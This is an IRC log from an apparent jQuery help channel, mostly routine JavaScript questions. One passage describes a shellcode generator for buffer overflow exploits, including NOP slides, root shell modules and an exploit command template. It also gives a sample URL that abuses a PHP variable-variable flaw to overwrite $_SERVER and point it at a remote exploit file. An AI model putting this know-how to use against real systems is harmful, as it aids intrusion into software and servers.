[18:35:23] <bot-t> coldhead, Why I consider setInterval to be harmful | Blog | Zetafleet | Web ... - http://zetafleet.com/blog/why-i-consider-setinterval-harmful
[18:35:34] <rosshadden> Blaster: I could talk for hours on why it's bad, but to be honest if it suits your needs than there's really nothing holding you back from using it
[18:36:03] <rosshadden> coldhead: I'm not saying setTimeout is bad, but in his case (polling a server to see if a file is uploaded) I believe it is.
[18:36:16] <rosshadden> oojacoboo: Welcome :)
[18:36:27] * oojacoboo is still learning :/
[18:36:45] <oojacoboo> works like  charm
[18:36:48] <coldhead> <rosshadden> Blaster: I could talk for hours on why it's bad <rosshadden> coldhead: I'm not saying setTimeout is bad
[18:37:40] <rosshadden> Hahaha. I could talk for hours on why it isn't the right tool for that purpose. Though I was exaggerating a lot.
[18:37:41] <Blaster> rosshadden: ok but how else could you poll the server until it's loaded?
[18:37:57] <Blaster> i tried your technique but it didn't work
[18:38:12] <aksnowman> ryanneufeld: got it working, thanks again a ton :)
[18:38:14] <Blaster> until it's uploaded*
[18:38:25] <aksnowman> now back to tweakign things, hahaha
[18:39:01] <rosshadden> Blaster: Dang, ok. Coldhead do you have any thoughts on his problem? The problem with setTimeout is that if it isn't uploaded by the time the timeout function runs, you either have to error out or create the timeout again.
[18:40:19] <coldhead> in my opinion, the loadedness of the image on the server is the server's problem
[18:40:30] <Blaster> couldn't setTimeout check every x seconds to see if it's uploaded, and if it is, then load img?
[18:40:38] <rosshadden> Blaster: Assign the setTimeout to a variable, and then somewhere in the timeout function, do a check to see if your image is loaded (however you are doing that in your situation). If it is, great. If it isn't, create the same timeout again, passing the original function.
[18:40:40] <coldhead> i'd provide a little json method that returns {loaded: false}
[18:40:40] <Blaster> the image will be uploaded from a completely different script
[18:40:52] <coldhead> and {loaded: true, url: /path/to/file}
[18:40:58] <coldhead> and i'd poll that thing in JS
[18:41:17] <Blaster> coldhead: which method would you use to poll it recursively?
[18:41:32] <coldhead> i would call setTimeout again from within setTimeout
[18:41:42] <coldhead> like in the zetafleet post above
[18:41:55] <Blaster> doesnt settimeout call a function every x seconds?  why would you need to call it again?
[18:42:07] <coldhead> settimeout is one-shot
[18:42:10] <rosshadden> Blaster: You are thinking about setInterval
[18:42:19] <Blaster> ohh
[18:42:27] <Blaster> so maybe that's more ideal?
[18:44:23] <Blaster> does an iframe on a page interfere with getElementById?  I'm getting permission denied when trying to access an element from my own page
[18:45:30] <coldhead> it depends on which domain the iframe is loading from
[18:45:38] <coldhead> you can't access stuff on different domains
[18:46:01] <coldhead> now someone point out that you can if you change the headers on the remote domain
[18:46:10] <coldhead> and i will break your favourite fingers
[18:46:26] <rosshadden> :-D
[18:47:53] <Blaster> the iframe is loading from an external domain, but I'm not trying to getElementById from the HTML inside the iframe, but from my own page
[18:49:40] <coldhead> i don't think that should be the case
[18:50:04] <coldhead> can you paste your code on jsfiddle or similar?
[18:50:13] <rosshadden> Blaster: That's interesting.. so you are calling document.getElementById() on an element that is in the root page, and it is saying Permission Denied?
[18:50:59] <rosshadden> The browser shouldn't behave like that
[18:51:42] <ryanneufeld> aksnowman: no worries man
[18:54:42] <oojacoboo> }(jQuery, 30);
[18:54:45] <oojacoboo> what would that mean?
[18:55:07] <oojacoboo> is that a namespace within jQuery?
[18:55:18] <oojacoboo> a timeout, or what
[18:56:22] <rosshadden> Where did you get it from, jQuery source?
[18:56:38] <oojacoboo> our app
[18:56:41] <oojacoboo> I didn't write it
[18:57:12] <context> oojacoboo: what
[18:57:23] <context> thata function call, passing in two parameters
[18:57:45] <context> oojacoboo: its probably just to give that code an anonymous namespace
[18:57:52] <rosshadden> It looks like a namespace thing to me, from the context of what you just pasted. However the "30" argument is definitely specific to your app.
[18:57:55] <oojacoboo> $(function() {}(jQuery, 30)
[18:57:56] <oojacoboo> that's it
[18:58:29] <context> maybe its returning a function
[18:58:32] <oojacoboo> I realize it's specific, I just didn't know what the second argument is in that function
[18:58:43] <oojacoboo> not called "30"
[18:59:09] <context> 30 is a number
[18:59:21] <oojacoboo> yea, and?
[19:00:58] <oojacoboo> it's gotta be a namespace thing
[19:01:27] <rosshadden> Maybe they are setting undefined to 30 :). Nobody beat me up, please.
[19:11:49] <ryanneufeld> coldhead?
[19:15:39] <aksnowman> ryanneufeld: out of curiosity, any idea why I can't drag to the .sortable() when the .sortable() is empty?
[19:16:12] <ryanneufeld> aksnowman: could be your CSS, try setting a height of like 200px to the sortable
[19:16:19] <aksnowman> I see an option for the .sortable, but it looks like it's the wrong direction, saying things from the .sortable can't go into *other* empty sortables, not controlling this one
[19:16:25] <aksnowman> ahh, k
[19:16:46] <aksnowman> yeah, figured since I have: containment: '#chain', it would auto-snap into it
[19:16:49] <aksnowman> but will give it a try
[19:17:04] <ryanneufeld> aksnowman: what I do is put a message in the empty sortable
[19:17:13] <ryanneufeld> and then on receive, I'll remove it
[19:17:20] <aksnowman> ohh, I like it :)
[19:17:27] <aksnowman> hadn't even thought of that
[19:17:33] <ryanneufeld> so that way you have a message "Drag from the left to here"
[19:17:40] <ryanneufeld> and then you have implicit instructions
[19:17:52] <aksnowman> yeah
[19:17:52] <ryanneufeld> and then when the drag the first one in
[19:17:55] <ryanneufeld> you remove the message
[19:18:13] <aksnowman> I was pondering a few minutes ago where to put those kind of instructions so I could get rid of my clicking ability for appending them
[19:18:24] <aksnowman> yeah, that's a perfect idea for it :)
[19:18:28] <ryanneufeld> the clicking is cool
[19:18:29] <ryanneufeld> keep itu
[19:18:31] <ryanneufeld> *keep it
[19:18:41] <ryanneufeld> unless it's causing problems
[19:19:40] <aksnowman> yeah? ok
[19:20:05] <ryanneufeld> personally, I think it adds some usability
[19:21:03] <aksnowman> now I just have a little CSS to fix, and I think functionality-wise it's finished, from here it's all just adding more modules to it :D
[19:21:22] <ryanneufeld> aksnowman: Im pretty interested in what you it's supposed to do
[19:21:30] <aksnowman> yeah?
[19:21:46] <ryanneufeld> wow, that was bad. Like how does it work
[19:22:23] <aksnowman> as far as interested in the shellcode part, or how the page itself functions, or something else? lol
[19:22:49] <babonk> How do I get a specific field from a JSON ajax response?
[19:22:58] <ryanneufeld> teh chell code part
[19:23:02] <ryanneufeld> babonk: it's an object
[19:23:07] <ryanneufeld> so us dot notation
[19:23:12] <aksnowman> ahh
[19:23:29] <ryanneufeld> wow, I can't type to today
[19:23:49] <ryanneufeld> The shell code part is what I'm interested in
[19:23:53] <aksnowman> I need to look into the endian-ness part of everything, but you know the basics of how binary exploitation works? buffer overflows, and such?
[19:24:11] <babonk> ryanneufeld: Okay, so like complete:function(data,status){ }
[19:24:12] <ryanneufeld> it's been a few years since uni when I studied that
[19:24:21] <babonk> ryanneufeld: Can I immediately do data.field?
[19:24:29] <ryanneufeld> babonk: yes
[19:24:31] <babonk> or do i need to specify some params on the $.ajax
[19:24:37] <babonk> or run some parsing function
[19:24:40] <ryanneufeld> babonk: as long as your dataType is json
[19:24:43] <babonk> k
[19:24:44] <babonk> awesomesauce
[19:24:46] <ryanneufeld> it will be an object
[19:24:52] <ryanneufeld> or if you use getJSON
[19:25:06] <ryanneufeld> aksnowman: yeah the basics of buffer overruns etc
[19:25:15] <ryanneufeld> aksnowman: pretty hard to find those though
[19:25:29] <aksnowman> ryanneufeld: essentially, I'm gonna make a ton of modules to do various things, like running system commands, giving you a shell, inserting addresses, nop slides, etc
[19:25:44] <ryanneufeld> interesting
[19:25:53] <ryanneufeld> and how would one execute those commands?
[19:25:58] <ryanneufeld> via post?
[19:25:58] <aksnowman> mainly 'cause I've hung out a long time @ hack3r.com (primarily IRC), and figured it'd be very helpful for learning for people
[19:26:00] <ryanneufeld> or get?
[19:26:14] <aksnowman> it doesn't actually execute anything
[19:26:27] <aksnowman> it gives you shellcode you would use in a buffer overflow exploit, or such
[19:26:45] <aksnowman> which is why it outputs in formats for a ton of different languages
[19:27:24] <aksnowman> like most exploits are typically distributed as C programs, so you coudl create your own shellcode using my generator, replace the shellcode in an exploit
[19:27:29] <aksnowman> or for learning, etc
[19:27:40] <aksnowman> if that makes any sense?
[19:28:11] <aksnowman> I'm kinda sick atm and I'm not making as much sense as I usuall ydo, haha
[19:28:13] <aksnowman> *usually do
[19:29:13] <aksnowman> example: typical BoF: ./someProg `perl -e 'print "exploit code goes here";'`
[19:30:39] <aksnowman> so you start off on my page and add the NOP module first for your nop slide, then you add a module (for example, becoming root, and executing a shell), then maybe another nops module w/ a few more for padding, and then the address you wanna use to overwrite the ret address
[19:31:01] <aksnowman> then click the button, it spits out the hex, which you copy+paste into the program to exploit it
[19:40:35] <ryanneufeld> oic
[19:40:49] <ryanneufeld> so you can append the hex code to an otherwise healthy binary?
[19:41:08] <aksnowman> ish
[19:41:18] <aksnowman> I know there are ways to inject code into other executables
[19:41:28] <aksnowman> you wouldn't just >> append to the binary
[19:41:39] <aksnowman> it would take a few extra steps, but it could be done, yes
[19:42:50] <ryanneufeld> ah
[19:43:10] <ryanneufeld> I found an interesting bit of legacy code
[19:43:25] <ryanneufeld> in our production environment
[19:43:40] <ryanneufeld> was there for over two years
[19:43:59] <ryanneufeld> worked around register_globals in php being disabled
[19:44:38] <ryanneufeld> but you could say pass in http://oursite.com/?_SERVER['DOCUMENT_ROOT']=http://mysite.com/somexploit.jpg??
[19:44:54] <ryanneufeld> and it would actually overwrite the _SERVER var
[19:45:00] <aksnowman> lmao, nice
[19:45:58] <aksnowman> is it just: extract( $_GET ); or something? lol
[19:46:16] <aksnowman> or does it actually at least check that the var starts w/ underscore? XD
[19:46:50] <ryanneufeld> no, it was worse
[19:46:59] <ryanneufeld> it used variable variables for extracting globals
[19:47:05] <ryanneufeld> so when it went through _GET
[19:47:08] <ryanneufeld> and got to _SERVER
[19:47:10] <ryanneufeld> it mutated it
[19:47:16] <ryanneufeld> and well fucked us
[19:47:33] <aksnowman> hahaha
[19:47:39] <ryanneufeld> fortunately I watch my error emails like a hawk, and found it right away
[19:47:51] <ryanneufeld> so me and another dev slayed it
[19:48:34] * aksnowman envisions several guys walking around in cardboard "armor", "slashing" things w/ wireless keyboards XD
[19:48:36] <ryanneufeld> foreach(array('_GET','_POST', more) { unset($_REQUEST[thing]}
[19:48:45] <ryanneufeld> aksnowman: you're not far off
[19:48:52] <aksnowman> hahaha
[19:48:55] <ryanneufeld> we did however judge a pumpkin contest when were were done
[19:49:09] <aksnowman> lmao
[19:50:32] <ryanneufeld> interestingly enough something else is going on with our site, and I'm not sure what... but it's down
[19:51:42] <ryanneufeld> I can't even ssh into it
[19:51:56] <aksnowman> ouch!
[19:52:18] <aksnowman> epic power or firewall fail? lol
[19:52:18] <ryanneufeld> yeah, I think it might be our backup script
[19:52:21] <ryanneufeld> no
[19:52:31] <ryanneufeld> it's behind akamai and load balancer
[19:52:37] <aksnowman> what else would take both the site and ssh?
[19:52:45] <aksnowman> brb
[19:52:51] <ryanneufeld> typically if this happens though, it's cause the server the DB lives on is disk thrashing
[19:53:10] <ryanneufeld> it's not my job to fix it, but if I can, I usually will
[19:55:21] <coldhead> ryanneufeld?

[20:22:53] <CannedCorn> hrmm having trouble with infinite scroll again, setting custom loadingText or done text isn't respected
[20:22:56] <CannedCorn> is that common
[20:23:08] <CannedCorn> wondering if this is the best way to go for this
[20:27:53] <coldhead> the bad news is that infinite scroll isn't very maintained anymore
[20:28:07] <coldhead> the good news is that the code is quite easy to modify/debug yourself!
[20:37:14] <CannedCorn> coldhead why isn't it being maintained, seems like it's awesome
[20:37:43] <CannedCorn> it's also the most followed of the scrolling plugins
[20:37:52] <CannedCorn> unless I'm missing something and there is a great one out there
[20:40:20] <coldhead> it was written with word press in mind
[20:40:29] <coldhead> and the author doesn't seem to have much love left for it
[20:40:36] <coldhead> he's moved on
[20:40:41] <CannedCorn> so what do people use these days?
[20:41:21] <coldhead> when i need infinite scrolling i use that
[20:41:28] <coldhead> and make whatever changes it requires to work
[20:43:51] <coldhead> from memory it sometimes needs help to find the Next link
[20:44:09] <coldhead> check github, there are probably new and improved forks
[20:47:47] <devslash> hey guys is anyone actively here
[20:50:26] <devslash> i need help figuring something out. I use the jquery plugin player to render a music player on my page. I'm trying to use css to change the volume bars' height . the volume bar is defined like this: <div class='jp-volume-bar' id='jp-volume-bar'><div class='jp-volume-bar-value' id='jp-volume-bar'></div></div>. which element do I apple the css to ? jp-volume-bar or jp-volume-bar-value ?
[21:23:34] <machogeek> I am having trouble w/ delegate method in IE8
[21:29:29] <eddiemonge> you could substitute "w/ delegate method" for anything else and it would be exactly the same sentence
[22:09:17] <kmels> hi, $("<li id='myId'><span>someText</span></li>").html() returns "<span>someText</span>", how can I get the full html? i.e. the html for the "li"
[22:13:54] <Blaster> anyone know why my ajax might be returning error even when the file exists?
[22:14:00] <Blaster> im trying to test whether an image exists at a specified URL
[22:56:01] <eddiemonge> Blaster: how are you doing it?
[22:56:14] <Blaster> i solved that issue
[22:56:17] <Blaster> but im nhaving a different problem
[22:56:30] <Blaster> i'm using .attr('src',url) to change the src of an <img>
[22:56:42] <Blaster> but it's only loading like 1/3 of the image in the box
[22:56:59] <Blaster> sometimes it loads the whole thing, but most of the time seems to be only loading like 1/3 or even 1/4 of it
[22:57:03] <eddiemonge> Blaster: if you do $(img)[0].src = "url" is it any different?
[22:58:01] <Blaster> yes doesnt load it at all with that
[22:58:12] <Blaster> and yes it is the first img element on the page
[22:58:51] <Blaster> is there a way I can have it delay about 1 second before doing something?
[22:58:54] <Blaster> I think I know the issue
[22:59:08] <Blaster> would this work? delay(500).$(".bookPic").attr("src", bookImg);
[22:59:26] <Blaster> I would tias but it wouldnt be immediately obvious in this circumstance
[22:59:31] <eddiemonge> no
[22:59:39] <eddiemonge> thats now what delay is or for
[22:59:55] <Blaster> well is there a way to delay a second or so before doing something?
[23:00:02] <eddiemonge> setTimeout
[23:00:10] <Blaster> ok
[23:00:17] <Blaster> i know why its only loading a quater
[23:00:31] <Blaster> this script is detecting when the image is uploaded, but I think it detects it before it's fully uploaded and tries changing the src too fast
[23:03:20] <Scott0> any jstree users here?
[23:03:51] <Scott0> looking to open all nodes by default, and possibly say to only open first level nodes
[23:04:21] <Blaster> hmm
[23:04:24] <Blaster> setTimeout isn't working :(
[23:04:25] <Scott0> the method in the docs used the id
[23:04:36] <Blaster> I put setTimeout("myFunction()",500) but the function doesn't get executed
[23:04:43] <Blaster> but if I replace that with myFunction() it's executed instantly
[23:04:46] <Scott0> and i dont want to add and id to every node for this
[23:07:28] <Oldgram> Hello! I'm having difficulties to make "sortable" of jQueryUI work naturally when the objects to be sortable are not of the same height. try this exmaple: http://jqueryui.com/demos/sortable/ and change (using firebug for ex.) the height of the first element to 150px. now when you try to sort it you have to take it down way far away then expected. Do you have a solution for that? (I tried to use some option and methods such as "refreshPositions" but that did
[23:07:29] <Oldgram> n't help) Thanks a lot!!
[23:12:56] <aktest> Let's say you've got a chat window w/ a scrollbar. How do you keep it scrolled to the bottom when new messages arrive?

[23:14:41] <eddiemonge> ?mdc setimeout @ Blaster
[23:14:42] <bot-t> Blaster, window.setTimeout - MDN - Executes a code snippet or a function after specified delay. https://developer.mozilla.org/en/DOM/window.setTimeout
[23:15:26] <Blaster> Is there any reason you can't use setTimeout to call the function you're already in?
[23:15:43] <eddiemonge> Blaster: you can if its a named function
[23:15:49] <Blaster> it is
[23:16:13] <Blaster> something is messed up though, because I can call the function directly, but as soon as I do setTimeout("functionName()",milliseconds) it doesn't go
[23:16:46] <eddiemonge> thats because thats not how you call a function using settimeout
[23:16:50] <eddiemonge> read the docs i sent you
[23:17:50] <Blaster> window.setTimeout(check(),500); ?
[23:18:31] <Blaster> still didn't work
[23:19:00] <eddiemonge> because thats still not right
[23:19:16] <eddiemonge> you are passing the return of check() to setTimeout
[23:19:30] <Blaster> k got it now
[23:19:37] <Blaster> thats a weird argument
[23:19:45] <Blaster> you can either do "something" something() or something
[23:20:20] <eddiemonge> not really. its the same as passing a function name as a param to anything else
[23:21:31] <Blaster> so if you just pass the function name it executes that function?
[23:21:34] <Blaster> for anything?
[23:23:02] <gf3> NO U
[23:25:24] <eddiemonge> wat
[23:25:32] <eddiemonge> gf3 is one crazy mofo
[23:25:38] <joeytwiddle> js> var f = function(){ return "hello"; }  f()
[23:25:58] <joeytwiddle> you aren't passing the name
[23:26:01] <joeytwiddle> you are passing the function
[23:26:17] <joeytwiddle> if you were passing the name, it would be like "check" i.e. a string
[23:28:49] <aktest> test
[23:29:20] <eddiemonge> fail
[23:30:02] <aktest> doh!
[23:31:54] <akavlie> I suppose, to answer my own previous question -- to scroll the window down on a new message, I'd probably have to call scrollTop() with some really huge number, right?
[23:32:37] <akavlie> or well, add to whatever the scrollTop is of the current position
[23:34:13] <ryanneufeld> akavlie: you can use # in the url to jump to any ID
[23:34:44] <akavlie> ryanneufeld: assuming you have IDs for everything...
[23:35:02] <ryanneufeld> akavlie: well, when you add a new message, you can add an id to it
[23:35:04] <ryanneufeld> ;)
[23:35:33] <akavlie> and assuming that you want that ID to show in the URL field. I think scrollTop() will probably work better here.
[23:35:59] <ryanneufeld> yeah, probably
[23:37:23] <dwarder> anyone uses this plugin http://trentrichardson.com/examples/timepicker/ for some reason if i call the timepicker widget like this $("#mydate").timepicker(); it calls datetimepicker, but if i add params to it as in $('#example10').timepicker({hourGrid: 4}); it will show up as a timepicker
[23:42:22] <puppen> dwarder: im guessing what you wanna do is call ($"#datetime").datetimepicker({vars:here});...
[23:42:55] <dwarder> puppen: your guess if wrong
[23:43:36] <dwarder> puppen: look at #example10 here http://trentrichardson.com/examples/timepicker/
[23:51:17] <dwarder> puppen: thanks anyway
